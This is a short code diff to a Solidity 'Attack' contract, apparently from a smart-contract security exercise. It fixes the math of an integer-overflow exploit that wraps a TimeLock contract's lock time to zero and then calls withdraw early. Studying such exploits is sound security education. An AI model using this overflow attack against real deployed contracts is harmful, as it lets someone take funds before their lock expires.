@@ -56,9 +56,11 @@ contract Attack {
         if t = current lock time then we need to find x such that
         x + t = 2**256 = 0
         so x = -t
+        2**256 = type(uint).max + 1
+        so x = type(uint).max + 1 - t
         */
         timeLock.increaseLockTime(
-            type(uint).max - timeLock.lockTime(address(this))
+            type(uint).max + 1- timeLock.lockTime(address(this))
         );
         timeLock.withdraw();
     }
